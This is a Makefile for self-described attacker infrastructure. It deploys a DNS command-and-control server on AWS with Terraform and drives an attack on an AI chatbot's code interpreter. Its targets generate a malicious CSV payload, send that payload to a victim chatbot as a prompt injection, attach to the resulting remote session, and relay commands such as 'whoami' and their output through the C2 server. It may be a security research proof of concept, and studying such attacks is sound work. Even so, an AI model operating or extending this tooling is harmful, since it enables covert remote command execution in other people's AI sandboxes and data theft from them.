# Attacker Infrastructure Makefile
# DNS C2 Server and Attack Tools
#
# This infrastructure is owned by the ATTACKER. It includes:
# - DNS C2 server (EC2) that receives callbacks from compromised targets
# - Attack tools for generating malicious payloads and interacting with sessions
#
# The attacker does NOT have access to victim's Code Interpreter.
# All interaction happens via the C2 server HTTP API.

# Load .env file if it exists (sets AWS_PROFILE)
ifneq (,$(wildcard .env))
include .env
export
endif

# =============================================================================
# Setup
# =============================================================================

setup-env:
	python3 -m venv venv
	. ../venv/bin/activate && python3 -m pip install --upgrade pip

install: setup-env
	@if [ -z "$$VIRTUAL_ENV" ]; then \
		echo "Activating venv and installing dependencies..."; \
		. ../venv/bin/activate && python3 -m pip install -r requirements.txt; \
	else \
		python3 -m pip install -r requirements.txt; \
	fi

# =============================================================================
# Terraform (C2 Infrastructure)
# =============================================================================

terraform-init:
	cd terraform && terraform init

terraform-plan:
	cd terraform && terraform plan

terraform-apply:
	cd terraform && terraform apply

terraform-destroy:
	cd terraform && terraform destroy

# Full deploy: init + plan + apply (auto-approve)
terraform-yolo: terraform-init
	cd terraform && terraform plan && terraform apply -auto-approve
	@echo ""
	@echo "✓ C2 Infrastructure deployed!"
	@echo ""
	@echo "Run: source set_env_vars.sh"
	@echo "Then: make configure-ec2"
	$(MAKE) configure-ec2

set-env-vars:
	@echo "⚠️  You cannot set environment variables via Makefile."
	@echo "    Run: source set_env_vars.sh"

configure-ec2:
	@bash -c 'source set_env_vars.sh && bash scripts/configure_ec2.sh'

# =============================================================================
# Attack Workflow
# =============================================================================

# Step 1: Generate malicious CSV with embedded payload
# Usage: make generate-csv
generate-csv:
	@bash -c 'source set_env_vars.sh && . ../venv/bin/activate && python3 src/csv_payload_generator.py --c2-domain $$DOMAIN'

# Generate CSV with custom session ID
# Usage: make generate-csv SESSION=sess_abc123
generate-csv-session:
	@if [ -z "$(SESSION)" ]; then \
		echo "Usage: make generate-csv-session SESSION=sess_abc123"; \
		exit 1; \
	fi
	@bash -c 'source set_env_vars.sh && . ../venv/bin/activate && python3 src/csv_payload_generator.py --c2-domain $$DOMAIN --session $(SESSION)'

# Step 2: (Manual) Upload CSV to victim's chatbot

# Step 3: Attach to session and interact
# Usage: make attach SESSION=sess_abc123
attach:
	@if [ -z "$(SESSION)" ]; then \
		echo ""; \
		echo "Usage: make attach SESSION=sess_abc123"; \
		echo ""; \
		echo "To get a session ID:"; \
		echo "  1. Run: make generate-csv"; \
		echo "  2. Upload the CSV to the victim chatbot"; \
		echo "  3. Use the session ID from step 1"; \
		echo ""; \
		exit 1; \
	fi
	@bash -c 'source set_env_vars.sh && . ../venv/bin/activate && python3 src/attacker_shell.py interactive --session $(SESSION)'

# Alias for attach (backwards compatibility)
operator: attach

# =============================================================================
# Automated Attack (sends CSV to victim chatbot API)
# =============================================================================

# Send prompt injection attack to victim chatbot
# Usage: make attack TARGET=https://chatbot.victim.com
attack:
	@if [ -z "$(TARGET)" ]; then \
		echo "Usage: make attack TARGET=https://victim-chatbot.com"; \
		echo ""; \
		echo "Or set VICTIM_URL environment variable:"; \
		echo "  export VICTIM_URL=https://victim-chatbot.com"; \
		echo "  make attack"; \
		exit 1; \
	fi
	@bash -c 'source set_env_vars.sh && . ../venv/bin/activate && python3 src/attack_client.py --target $(TARGET) --c2-domain $$DOMAIN'

# =============================================================================
# C2 Server Management
# =============================================================================

# View C2 server logs (CloudWatch)
logs:
	@echo "📊 Tailing DNS C2 server logs from CloudWatch..."
	@echo "   Log Group: /aws/ec2/dns-c2-server"
	@echo ""
	@aws logs tail /aws/ec2/dns-c2-server --follow --region us-east-1

# Check DNS server status
check-dns:
	@bash -c 'source set_env_vars.sh && bash scripts/check_dns_status.sh'

# Upload updated DNS server to S3, then deploy and restart on EC2
update-dns:
	cd terraform && terraform apply -auto-approve -target=aws_s3_object.dns_server_with_api
	$(MAKE) configure-ec2

# Test DNS resolution
test-dns:
	@bash -c 'source set_env_vars.sh && python3 test_dns.py --domain $$DOMAIN'

# =============================================================================
# Direct Session Commands (for scripting)
# =============================================================================

# Send a single command to a session
# Usage: make send CMD="whoami" SESSION=sess_abc123
send:
	@if [ -z "$(SESSION)" ] || [ -z "$(CMD)" ]; then \
		echo "Usage: make send CMD=\"whoami\" SESSION=sess_abc123"; \
		exit 1; \
	fi
	@bash -c 'source set_env_vars.sh && . ../venv/bin/activate && python3 src/attacker_shell.py send "$(CMD)" --session $(SESSION)'

# Receive output from a session
# Usage: make receive SESSION=sess_abc123
receive:
	@if [ -z "$(SESSION)" ]; then \
		echo "Usage: make receive SESSION=sess_abc123"; \
		exit 1; \
	fi
	@bash -c 'source set_env_vars.sh && . ../venv/bin/activate && python3 src/attacker_shell.py receive --session $(SESSION)'

# =============================================================================
# Testing
# =============================================================================

test:
	@echo "Running DNS protocol tests..."
	@. ../venv/bin/activate && python3 tests/test_dns_protocol.py
	@echo ""
	@echo "Running DNS server tests..."
	@. ../venv/bin/activate && python3 tests/test_dns_server.py
	@echo ""
	@echo "Running integration tests..."
	@. ../venv/bin/activate && python3 tests/test_dns_integration.py

test-verbose:
	@echo "Running DNS protocol tests (verbose)..."
	@. ../venv/bin/activate && python3 tests/test_dns_protocol.py -v
	@echo ""
	@echo "Running DNS server tests (verbose)..."
	@. ../venv/bin/activate && python3 tests/test_dns_server.py -v
	@echo ""
	@echo "Running integration tests (verbose)..."
	@. ../venv/bin/activate && python3 tests/test_dns_integration.py -v

# =============================================================================
# Help
# =============================================================================

help:
	@echo ""
	@echo "DNS C2 Attacker Infrastructure"
	@echo "==============================="
	@echo ""
	@echo "Setup:"
	@echo "  make install              Install dependencies"
	@echo "  make terraform-yolo       Deploy C2 infrastructure"
	@echo "  source set_env_vars.sh    Export environment variables"
	@echo ""
	@echo "Attack Workflow:"
	@echo "  make generate-csv         Generate malicious CSV with payload"
	@echo "  (upload CSV to victim)    Manual step"
	@echo "  make attach SESSION=xxx   Attach to session and send commands"
	@echo ""
	@echo "Automated Attack:"
	@echo "  make attack TARGET=url    Send CSV directly to victim chatbot API"
	@echo ""
	@echo "C2 Management:"
	@echo "  make logs                 View C2 server logs"
	@echo "  make check-dns            Check DNS server status"
	@echo "  make update-dns           Redeploy DNS server code"
	@echo ""
	@echo "Scripting:"
	@echo "  make send CMD=x SESSION=x Send single command"
	@echo "  make receive SESSION=x    Get output from session"
	@echo ""

.PHONY: setup-env install terraform-init terraform-plan terraform-apply terraform-destroy \
        terraform-yolo set-env-vars configure-ec2 generate-csv generate-csv-session attach \
        operator attack logs check-dns update-dns test-dns send receive test test-verbose help
